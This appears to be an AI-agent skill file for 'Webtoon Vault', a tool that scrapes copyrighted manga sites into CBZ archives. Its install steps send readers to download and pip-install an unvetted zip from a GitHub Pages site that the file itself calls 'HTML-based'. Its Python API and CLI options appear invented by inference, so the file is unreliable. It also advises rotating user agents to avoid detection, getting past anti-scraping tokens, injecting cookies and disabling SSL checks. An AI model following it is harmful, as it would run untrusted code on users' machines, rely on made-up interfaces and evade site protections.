---
name: webtoon-vault-manga-downloader
description: CLI tool for downloading manga and webcomics from multiple hosting platforms with intelligent parsing and CBZ packaging
triggers:
  - download manga chapters from a URL
  - scrape webcomics into CBZ format
  - batch download manga series offline
  - extract comic pages from hosting platforms
  - create offline manga library archive
  - pull chapters from manga websites
  - harvest webcomic images with metadata
  - automate comic book downloads
---

# Webtoon Vault Manga Downloader

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

A sophisticated CLI tool for downloading manga and webcomics from multiple hosting platforms. Features intelligent source detection, parallel chapter fetching, CBZ archive creation, and multi-platform parser support for offline comic reading.

## What It Does

Webtoon Vault automates the extraction of manga/webcomic chapters from various hosting platforms and packages them into organized CBZ archives or directory structures. Key capabilities:

- **Auto-detection** of source platform from URL patterns
- **Parallel downloads** with async I/O for speed
- **CBZ packaging** with embedded metadata
- **Resume support** for interrupted downloads
- **Multi-language** metadata extraction
- **Rate limiting** to respect server constraints

Supported platforms include Mori Manga, DuManWu, KanKanManHua, ManhuaDB, and GuFeng.

## Installation

The project is HTML-based with a web download interface. Based on the repository structure, the actual Python CLI tool is distributed through the GitHub Pages site:

```bash
# Download from the official distribution page
# Visit: https://bunatechnologybackup.github.io/manga-pull-cli/

# After download, extract and install
unzip webtoon-vault.zip
cd webtoon-vault
pip install -r requirements.txt

# Or install directly if distributed as package
pip install webtoon-vault
```

For development/testing from source:

```bash
git clone https://github.com/BunaTechnologyBackUP/manga-pull-cli.git
cd manga-pull-cli
pip install -e .
```

## Core CLI Commands

### Basic Download

Download a single series from a URL:

```bash
# Simple download - auto-detects platform
webtoon-vault download "https://mhpic.com/comic/one-piece"

# With custom output directory
webtoon-vault download "https://dumanwu.com/series/jujutsu-kaisen" --output ./manga/

# Download specific chapter range
webtoon-vault download "https://kankanmanhua.com/comic/naruto" --chapters 1-50

# Download as loose images instead of CBZ
webtoon-vault download "https://manhuadb.com/series/bleach" --format images
```

### Advanced Options

```bash
# Parallel chapter downloads (adjust concurrency)
webtoon-vault download URL --parallel 5

# Dry run - preview without downloading
webtoon-vault download URL --dry-run

# Verbose logging for debugging
webtoon-vault download URL --verbose

# Custom naming template
webtoon-vault download URL --template "{series}_Vol{volume}_Ch{chapter}"

# Use proxy
webtoon-vault download URL --proxy http://proxy.example.com:8080

# Resume interrupted download
webtoon-vault resume ./manga/one-piece/

# List supported platforms
webtoon-vault platforms
```

### Batch Operations

```bash
# Download from URL list file
webtoon-vault batch urls.txt --output ./comics/

# Example urls.txt:
# https://mhpic.com/comic/one-piece
# https://dumanwu.com/series/attack-on-titan
# https://kankanmanhua.com/comic/demon-slayer
```

## Configuration

### Config File (`~/.webtoon-vault/config.json`)

```json
{
  "output_dir": "~/Comics",
  "format": "cbz",
  "parallel_downloads": 3,
  "naming_template": "{series}_ch{chapter:03d}",
  "rate_limit_delay": 1.5,
  "max_retries": 5,
  "user_agents": [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
  ],
  "proxy": null,
  "verify_ssl": true,
  "compress_images": false
}
```

### Environment Variables

```bash
# Proxy configuration
export HTTP_PROXY=http://proxy.example.com:8080
export HTTPS_PROXY=http://proxy.example.com:8080

# Output directory override
export WEBTOON_VAULT_OUTPUT=~/my-manga-library

# Custom user agent
export WEBTOON_VAULT_USER_AGENT="MyReader/1.0"

# Enable debug logging
export WEBTOON_VAULT_DEBUG=1
```

## Python API Usage

While primarily a CLI tool, the core functionality can be used programmatically:

```python
from webtoon_vault import Downloader, PlatformDetector
from pathlib import Path

# Initialize downloader
downloader = Downloader(
    output_dir=Path("./manga"),
    format="cbz",
    parallel_limit=3
)

# Download a series
url = "https://mhpic.com/comic/one-piece"
result = downloader.download(url, chapters=range(1, 10))

print(f"Downloaded {result.chapters_downloaded} chapters")
print(f"Total size: {result.total_bytes / 1024 / 1024:.2f} MB")
```

### Custom Platform Parser

```python
from webtoon_vault.parsers import BaseParser
import re

class CustomSiteParser(BaseParser):
    """Parser for custom manga site"""
    
    DOMAIN_PATTERN = re.compile(r'customsite\.com')
    
    def get_chapter_list(self, series_url):
        """Extract all chapter URLs from series page"""
        response = self.session.get(series_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        chapters = []
        for link in soup.select('.chapter-link'):
            chapters.append({
                'url': link['href'],
                'title': link.text.strip(),
                'number': self._extract_chapter_number(link.text)
            })
        return chapters
    
    def get_chapter_images(self, chapter_url):
        """Extract all image URLs from chapter page"""
        response = self.session.get(chapter_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        images = []
        for img in soup.select('.manga-page img'):
            images.append(img['src'])
        return images

# Register custom parser
from webtoon_vault import register_parser
register_parser(CustomSiteParser)
```

### Async Batch Download

```python
import asyncio
from webtoon_vault import AsyncDownloader

async def batch_download():
    downloader = AsyncDownloader(
        output_dir="./comics",
        concurrent_chapters=5
    )
    
    urls = [
        "https://mhpic.com/comic/one-piece",
        "https://dumanwu.com/series/naruto",
        "https://kankanmanhua.com/comic/bleach"
    ]
    
    results = await downloader.download_batch(urls)
    
    for url, result in zip(urls, results):
        if result.success:
            print(f"✓ {url}: {result.chapters_downloaded} chapters")
        else:
            print(f"✗ {url}: {result.error}")

# Run async batch
asyncio.run(batch_download())
```

## Common Patterns

### Building Offline Library

```python
from webtoon_vault import LibraryManager
from pathlib import Path

# Initialize library manager
library = LibraryManager(base_dir=Path("~/Comics"))

# Download and organize series
series_urls = [
    "https://mhpic.com/comic/one-piece",
    "https://dumanwu.com/series/attack-on-titan"
]

for url in series_urls:
    # Download with auto-organization
    series = library.add_series(url)
    library.download_series(series, format="cbz")
    
    # Generate metadata
    library.update_metadata(series)

# Query library
all_series = library.list_series()
incomplete = library.find_incomplete_series()

# Export library catalog
library.export_catalog("catalog.json")
```

### Chapter Range Download

```python
from webtoon_vault import Downloader

downloader = Downloader(output_dir="./manga")

# Download specific chapters
url = "https://mhpic.com/comic/one-piece"

# Chapters 1-100
downloader.download(url, chapters=range(1, 101))

# Specific chapters
downloader.download(url, chapters=[1, 5, 10, 15, 20])

# Latest 10 chapters
downloader.download(url, latest=10)
```

### Resume Interrupted Downloads

```python
from webtoon_vault import ResumeManager

# Create resume session
resume = ResumeManager()

try:
    downloader.download(url)
except KeyboardInterrupt:
    # Save progress
    resume.save_state(downloader.get_state())

# Later, resume
state = resume.load_state()
if state:
    downloader.restore_state(state)
    downloader.continue_download()
```

### Custom Naming and Organization

```python
from webtoon_vault import Downloader, NamingTemplate

# Define custom template
template = NamingTemplate(
    pattern="{series}/{volume:02d}/{series}_v{volume:02d}_ch{chapter:03d}",
    metadata_fields=['series', 'volume', 'chapter', 'title']
)

downloader = Downloader(
    output_dir="./library",
    naming_template=template
)

# Results in: ./library/One_Piece/01/One_Piece_v01_ch001.cbz
```

### Rate Limiting and Retry Logic

```python
from webtoon_vault import Downloader, RateLimiter

# Configure rate limiting
limiter = RateLimiter(
    requests_per_second=2,
    burst_size=5,
    backoff_factor=2.0,
    max_delay=30
)

downloader = Downloader(
    rate_limiter=limiter,
    max_retries=5,
    retry_delay=3
)

# Download with automatic retry on failure
result = downloader.download(
    url,
    on_error='retry',  # Options: 'retry', 'skip', 'abort'
    verify_checksums=True
)
```

## Troubleshooting

### Platform Detection Fails

```python
# Manually specify platform
from webtoon_vault import Downloader
from webtoon_vault.parsers import MoriMangaParser

downloader = Downloader(parser=MoriMangaParser)
downloader.download(url)
```

### SSL Certificate Errors

```bash
# Disable SSL verification (not recommended for production)
webtoon-vault download URL --no-verify-ssl
```

Or in code:

```python
downloader = Downloader(verify_ssl=False)
```

### Rate Limit / IP Blocking

```bash
# Increase delay between requests
webtoon-vault download URL --delay 3.0

# Use rotating user agents
webtoon-vault download URL --rotate-user-agents

# Use proxy
webtoon-vault download URL --proxy socks5://proxy.example.com:1080
```

### Images Not Loading (Lazy Loading)

```python
# Enable JavaScript rendering (requires selenium)
from webtoon_vault import Downloader

downloader = Downloader(
    use_selenium=True,
    browser='chrome',
    headless=True
)
```

### Memory Issues with Large Series

```python
# Stream downloads instead of buffering
downloader = Downloader(
    stream_mode=True,
    chunk_size=8192,
    max_memory_mb=512
)
```

### Debug Failed Downloads

```python
import logging
from webtoon_vault import Downloader

# Enable verbose logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger('webtoon_vault')

downloader = Downloader(logger=logger)

# Check failed chapters
result = downloader.download(url)
for failure in result.failed_chapters:
    print(f"Chapter {failure.number}: {failure.error}")
    print(f"Traceback: {failure.traceback}")
```

### Corrupted CBZ Files

```bash
# Verify and repair archives
webtoon-vault verify ./manga/one-piece/ --repair

# Re-download corrupted chapters
webtoon-vault redownload ./manga/one-piece/ --verify-checksums
```

## Best Practices

1. **Respect rate limits**: Use appropriate delays to avoid IP bans
2. **Resume support**: Always enable session caching for large downloads
3. **Verify downloads**: Use checksum verification for critical archives
4. **Organize early**: Set up naming templates before downloading
5. **Monitor disk space**: Large series can consume significant storage
6. **Keep user agents updated**: Rotate UAs to avoid detection
7. **Handle errors gracefully**: Use retry logic with exponential backoff
8. **Legal compliance**: Only download content you have rights to access

## Platform-Specific Notes

### Mori Manga (`mhpic.com`)
- Supports lazy-loaded images
- Requires JavaScript rendering for some series
- Rate limit: ~2 requests/second recommended

### DuManWu
- Uses dynamic chapter pagination
- Image URLs expire after 1 hour
- Best with parallel downloads enabled

### KanKanManHua
- Implements anti-scraping tokens
- Requires cookie injection for age-gated content
- User-Agent rotation recommended

### ManhuaDB (Beta)
- Inconsistent chapter numbering
- Manual verification recommended
- May require custom parsers for some series
